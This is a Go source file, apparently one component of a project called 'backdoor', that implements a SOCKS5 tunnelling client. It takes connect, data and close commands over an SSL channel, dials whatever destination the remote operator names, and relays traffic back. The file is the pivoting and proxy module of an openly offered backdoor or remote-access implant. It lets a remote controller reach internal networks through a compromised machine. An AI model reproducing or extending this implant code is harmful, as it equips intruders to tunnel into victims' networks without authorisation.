package main

import (
	"backdoor/util"
	"encoding/binary"
	"fmt"
	"net"
	"sync"
	"time"
)

type DstInfo struct {
	session *util.ConnWrap
	buffer  []byte
}

type Socks5Client struct {
	conn    *util.SSLConn
	msgchan *util.MsgChan

	mutex    sync.Mutex
	sessions map[uint32]*DstInfo
}

func NewSocks5Client(sslconn *util.SSLConn) *Socks5Client {
	pnew := new(Socks5Client)
	pnew.conn = sslconn
	pnew.msgchan = util.NewMsgChan()
	pnew.sessions = make(map[uint32]*DstInfo)
	go pnew.loopProc()
	return pnew
}

func (client *Socks5Client) OnMsg(msg []byte) {
	client.msgchan.In(msg)
}

func (client *Socks5Client) loopProc() {
	for {
		msg, ok := client.msgchan.Out()
		if !ok {
			break
		}
		cmd := msg[0]
		msg = msg[1:]
		switch cmd {
		case util.SOCKS5_CONNECT:
			client.procConnect(msg)
		case util.SOCKS5_DATA:
			client.procData(msg)
		case util.SOCKS5_CLOSE:
			client.procClose(msg)
		}
	}
	client.stop()
}

func (client *Socks5Client) procConnect(msg []byte) {
	sid := binary.LittleEndian.Uint32(msg[:])
	dst := parseDstAddr(msg[4:])
	client.mutex.Lock()
	defer client.mutex.Unlock()
	client.sessions[sid] = new(DstInfo)
	go connectDst(client, sid, dst)
}

func (client *Socks5Client) procData(msg []byte) {
	sid := binary.LittleEndian.Uint32(msg[:])
	client.mutex.Lock()
	defer client.mutex.Unlock()
	pdst := client.sessions[sid]
	if pdst == nil {
		return
	}
	if pdst.session == nil {
		pdst.buffer = append(pdst.buffer, msg[4:]...)
	} else {
		pdst.session.Write(msg[4:])
	}
}

func (client *Socks5Client) procClose(msg []byte) {
	sid := binary.LittleEndian.Uint32(msg[:])
	client.mutex.Lock()
	defer client.mutex.Unlock()
	pdst := client.sessions[sid]
	if pdst == nil {
		return
	}
	if pdst.session != nil {
		pdst.session.Close()
	}
	delete(client.sessions, sid)
}

func (client *Socks5Client) OnClose() {
	client.msgchan.Close()
}

func (client *Socks5Client) stop() {
	client.mutex.Lock()
	defer client.mutex.Unlock()
	for _, v := range client.sessions {
		if v.session != nil {
			v.session.Close()
		}
	}
	client.sessions = make(map[uint32]*DstInfo)
}

func (client *Socks5Client) addSession(sid uint32, conn *util.ConnWrap) bool {
	client.mutex.Lock()
	defer client.mutex.Unlock()
	session := client.sessions[sid]
	if session == nil {
		return false
	}
	session.session = conn
	if len(session.buffer) != 0 {
		conn.Write(session.buffer)
		session.buffer = nil
	}
	return true
}

func (client *Socks5Client) delSession(sid uint32) {
	client.mutex.Lock()
	defer client.mutex.Unlock()
	session := client.sessions[sid]
	if session == nil {
		return
	}
	delete(client.sessions, sid)
	util.SendSocksMsg(client.conn, util.SOCKS5_CLOSE, sid, nil)
}

func parseDstAddr(body []byte) string {
	if body[0] == 1 {
		dstip := net.IPv4(body[1], body[2], body[3], body[4])
		return fmt.Sprintf("%s:%d", dstip.String(), binary.BigEndian.Uint16(body[5:]))
	}
	return fmt.Sprintf("%s:%d", string(body[2:len(body)-2]), binary.BigEndian.Uint16(body[len(body)-2:]))
}

func connectDst(client *Socks5Client, sid uint32, addr string) {
	defer client.delSession(sid)
	tmpConn, err := net.DialTimeout("tcp", addr, 15*time.Second)
	if err != nil {
		return
	}
	conn := util.NewConnWrap(tmpConn)
	defer conn.Close()
	if !client.addSession(sid, conn) {
		return
	}
	var buffer [1024]byte
	for {
		n, err := conn.Read(buffer[:])
		if err != nil {
			break
		}
		if n == 0 {
			continue
		}
		util.SendSocksMsg(client.conn, util.SOCKS5_DATA, sid, buffer[:n])
	}
}
